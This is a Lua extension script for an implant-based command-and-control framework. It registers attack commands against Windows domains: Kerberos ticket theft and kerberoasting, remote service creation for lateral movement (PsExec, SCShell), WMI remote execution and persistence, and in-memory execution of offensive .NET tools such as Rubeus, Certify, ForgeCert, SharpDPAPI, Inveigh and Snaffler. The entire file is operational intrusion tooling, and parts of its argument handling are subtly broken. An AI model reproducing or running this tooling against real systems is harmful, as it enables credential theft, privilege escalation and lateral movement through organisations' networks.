local lib = require("community-lib")

local function is_hex_number(hex_str)
    local result,err = regexp.match("^0x[a-fA-F0-9]+$",hex_str)
    if err then error(err) end
    return result ~= nil
end

local function is_base64(base64_str)
    local result,err = regexp.match("^[A-Za-z0-9+/]+={0,2}$",base64_str)
    if err then error(err) end
    return result ~= nil
end

local function run_nanorobeus_sessions(cmd,args)
    local session = active()
    local command = "sessions"
    local arg1 = ""
    local arg2 = ""
    local arg3 = ""
    local arg4 = ""
    if #args > 2 then
        error("Error: Too many arguments")
    end
    if #args == 2 then
        arg1 = args[1]
        arg2 = args[2]
        if arg1 ~= 'luid' and arg1 ~= 'pid' then
            error("Error: Invalid first argument")
        end
        if not(is_hex_number(arg2)) then
            error("Error: Invalid second argument")
        end
    elseif #args == 1 then
        arg1 = args[1]
        if arg1 ~= '/all' then
            error("Error: Invalid first argument")
        end
    end
    local bof_path = script_resource("domain/nanorobeus/bin/nanorobeus."..session.Os.Arch..".o")
    local pack_args = bof_pack("zzzzz",command,arg1,arg2,arg3,arg4)
    return bof(session, bof_path, pack_args, true)
end
command( "domain:sessions", run_nanorobeus_sessions, "Usage: domain sessions", "")

local function run_kerberoast(cmd,args)
    local session = active()
    local command = "kerberoast"
    local arg1 = ""
    local arg2 = ""
    local arg3 = ""
    local arg4 = ""
    if #args > 1 then
        error("Error: Too many arguments")
    end
    if #args == 1 then
        arg1 = args[1]
    end
    local bof_path = script_resource("domain/nanorobeus/bin/nanorobeus."..session.Os.Arch..".o")
    local pack_args = bof_pack("zzzzz",command,arg1,arg2,arg3,arg4)
    return bof(session, bof_path, pack_args, true)
end
command( "domain:kerberoast", run_kerberoast, "Usage: domain kerberoast <target>", "")


local function run_tgtdeleg(cmd,args)
    local session = active()
    local command = "tgtdeleg"
    local arg1 = ""
    local arg2 = ""
    local arg3 = ""
    local arg4 = ""
    if #args ~= 1 then
        error("Error: One argument must be entered")
    end
    arg1 = args[1]
    local bof_path = script_resource("domain/nanorobeus/bin/nanorobeus."..session.Os.Arch..".o")
    local pack_args = bof_pack("zzzzz",command,arg1,arg2,arg3,arg4)
    return bof(session, bof_path, pack_args, true)
end
command( "domain:tgtdeleg", run_tgtdeleg, "Usage: domain tgtdeleg <target>", "")


local function run_psexec(cmd,args)
    local session = active()
    local Host = ""
    local SvcName = ""
    local SvcPath = ""
    local SvcBinary
    if #args ~= 3 then
        error("Error: U must enter 3 arguments")
    end
    Host = args[1]
    SvcName = args[2]
    SvcPath = args[3]
    local svc_handle = io.open(SvcPath, "rb")
    if not svc_handle then
        error("Error: Service executable not found")
    end
    SvcBinary = svc_handle:read("*a")
    svc_handle:close()

    local bof_path = script_resource("domain/Psexec/Psexec."..session.Os.Arch..".o")
    local pack_args = bof_pack("zzzz",Host,SvcName,SvcBinary,'\\\\' + Host + '\\C$\\Windows\\' + SvcName + ".exe")
    return bof(session, bof_path, pack_args, true)
end
command( "domain:psexec", run_psexec, "Usage: domain psexec <Host> <Service Name> <Local Path>", "")


local function run_scshell(cmd,args)
    local session = active()
    local Host = ""
    local SvcName = ""
    local SvcPath = ""
    local SvcBinary
    if #args ~= 3 then
        error("Error: U must enter 3 arguments")
    end
    Host = args[1]
    SvcName = args[2]
    SvcPath = args[3]
    local svc_handle = io.open(SvcPath, "rb")
    if not svc_handle then
        error("Error: Service executable not found")
    end
    SvcBinary = svc_handle:read("*a")
    svc_handle:close()

    local bof_path = script_resource("domain/ScShell/ScShell."..session.Os.Arch..".o")
    local pack_args = bof_pack("zzzz",Host,SvcName,SvcBinary,'\\\\' + Host + '\\C$\\Windows\\' + SvcName + ".exe")
    return bof(session, bof_path, pack_args, true)
end
command( "domain:scshell", run_scshell, "Usage: domain scshell <Host> <Service Name> <Local Path>", "")

local function run_wmi_eventsub(cmd,args)
    local session = active()
    if session.Os.Arch == "x86" then
        error("Error: x86 is not supported")
    end
    local target = ""
    local username = ""
    local password = ""
    local domain = ""
    local is_current = 1
    if #args < 2 then
        error("Error: Not enough parameters")
    end
    if #args > 5 then
        error("Error: Too many parameters")
    end
    target = "\\\\"..args[1].."\\ROOT\\SUBSCRIPTION"
    local vbs_handle = io.open(args[2], "r")
    if not vbs_handle then
        error("Error: Invalid vbscript path")
    end
    local vbs = vbs_handle:read("*a")
    vbs_handle:close()
    if #args > 2 and #args < 5 then
        error("Error: Not enough parameters")
    end
    if #args == 6 then
        is_current = 0
        username = args[4]
        password = args[5]
        domain = args[6]
    end
    local pack_args = bof_pack("ZZZZi",target,domain,username,password,vbs,is_current)
    local bof_path = script_resource("domain/Wmi/EventSub/bin/EventSub."..session.Os.Arch..".o")
    return bof(session, bof_path, pack_args, true)
end
command( "domain:wmi_eventsub", run_wmi_eventsub, "Usage: domain wmi_eventsub <target> <local_script_path> <otp:username> <otp:password> <otp:domain>", "")

local function run_wmi_proccreate(cmd,args)
    local session = active()
    if session.Os.Arch == "x86" then
        error("Error: x86 is not supported")
    end
    local target = ""
    local username = ""
    local password = ""
    local domain = ""
    local command = ""
    local is_current = 1
    if #args < 2 then
        error("Error: Not enough parameters")
    end
    if #args > 5 then
        error("Error: Too many parameters")
    end
    target = "\\\\"..args[1].."\\ROOT\\CIMV2"
    command = args[2]
    if #args > 2 and #args < 5 then
        error("Error: Not enough parameters")
    end
    if #args == 6 then
        is_current = 0
        username = args[4]
        password = args[5]
        domain = args[6]
    end
    local pack_args = bof_pack("ZZZZi",target,domain,username,password,command,is_current)
    local bof_path = script_resource("domain/Wmi/ProcCreate/bin/ProcCreate."..session.Os.Arch..".o")
    return bof(session, bof_path, pack_args, true)
end
command( "domain:wmi_proccreate", run_wmi_proccreate, "Usage: domain wmi_proccreate <target> <command> <otp:username> <otp:password> <otp:domain>", "")


-- ADCSPwn_v1.1
local function run_ADCSPwn_v1_1(args)
    local session = active()
    local pe_path = script_resource("domain/ADCSPwn/ADCSPwn_v1.1.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:ADCSPwn_v1.1", run_ADCSPwn_v1_1, "Usage: ADCSPwn_v1.1 args", "")

-- Certify
local function run_Certify(args)
    local session = active()
    local pe_path = script_resource("domain/Certify/Certify.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:Certify", run_Certify, "Usage: Certify args", "")

-- ForgeCert
local function run_ForgeCert(args)
    local session = active()
    local pe_path = script_resource("domain/ForgeCert/ForgeCert.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:ForgeCert", run_ForgeCert, "Usage: ForgeCert args", "")

-- Inveigh_NET35
local function run_Inveigh_NET35(args)
    local session = active()
    local pe_path = script_resource("domain/Inveigh/Inveigh_NET35.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:Inveigh_NET35", run_Inveigh_NET35, "Usage: Inveigh_NET35 args", "")

-- Inveigh_NET46
local function run_Inveigh_NET46(args)
    local session = active()
    local pe_path = script_resource("domain/Inveigh/Inveigh_NET46.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:Inveigh_NET46", run_Inveigh_NET46, "Usage: Inveigh_NET46 args", "")

-- Koh
local function run_Koh(args)
    local session = active()
    local pe_path = script_resource("domain/Koh/Koh.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:Koh", run_Koh, "Usage: Koh args", "")

-- MalSCCM
local function run_MalSCCM(args)
    local session = active()
    local pe_path = script_resource("domain/MalSCCM/MalSCCM.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:MalSCCM", run_MalSCCM, "Usage: MalSCCM args", "")

-- winPEASx64
local function run_winPEASx64(args)
    local session = active()
    local pe_path = script_resource("domain/PEASS/winPEASx64.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:winPEASx64", run_winPEASx64, "Usage: winPEASx64 args", "")

-- winPEASx86
local function run_winPEASx86(args)
    local session = active()
    local pe_path = script_resource("domain/PEASS/winPEASx86.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:winPEASx86", run_winPEASx86, "Usage: winPEASx86 args", "")

-- Rubeus
local function run_Rubeus(args)
    local session = active()
    local pe_path = script_resource("domain/Rubeus/Rubeus.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:Rubeus", run_Rubeus, "Usage: Rubeus args", "")

-- SharpDPAPI
local function run_SharpDPAPI(args)
    local session = active()
    local pe_path = script_resource("domain/SharpDPAPI/SharpDPAPI.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:SharpDPAPI", run_SharpDPAPI, "Usage: SharpDPAPI args", "")

-- SharpHound_v2.6.3
local function run_SharpHound_v2_6_3(args)
    local session = active()
    local pe_path = script_resource("domain/SharpHound/SharpHound_v2.6.3.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:SharpHound_v2.6.3", run_SharpHound_v2_6_3, "Usage: SharpHound_v2.6.3 args", "")

-- SharpMapExec
local function run_SharpMapExec(args)
    local session = active()
    local pe_path = script_resource("domain/SharpMapExec/SharpMapExec.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:SharpMapExec", run_SharpMapExec, "Usage: SharpMapExec args", "")

-- Snaffler_v1.0.198
local function run_Snaffler_v1_0_198(args)
    local session = active()
    local pe_path = script_resource("domain/Snaffler/Snaffler_v1.0.198.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:Snaffler_v1.0.198", run_Snaffler_v1_0_198, "Usage: Snaffler_v1.0.198 args", "")

-- Spartacus_v2.2.2
local function run_Spartacus_v2_2_2(args)
    local session = active()
    local pe_path = script_resource("domain/Spartacus/Spartacus_v2.2.2.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:Spartacus_v2.2.2", run_Spartacus_v2_2_2, "Usage: Spartacus_v2.2.2 args", "")

-- StandIn_v13_Net35
local function run_StandIn_v13_Net35(args)
    local session = active()
    local pe_path = script_resource("domain/Standln/StandIn_v13_Net35.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:StandIn_v13_Net35", run_StandIn_v13_Net35, "Usage: StandIn_v13_Net35 args", "")

-- StandIn_v13_Net45
local function run_StandIn_v13_Net45(args)
    local session = active()
    local pe_path = script_resource("domain/Standln/StandIn_v13_Net45.exe")
    local arch = session.Os.Arch
    local sac = new_sac()
    return execute_assembly(session, pe_path, args, true,new_sac())
end
command("domain:StandIn_v13_Net45", run_StandIn_v13_Net45, "Usage: StandIn_v13_Net45 args", "")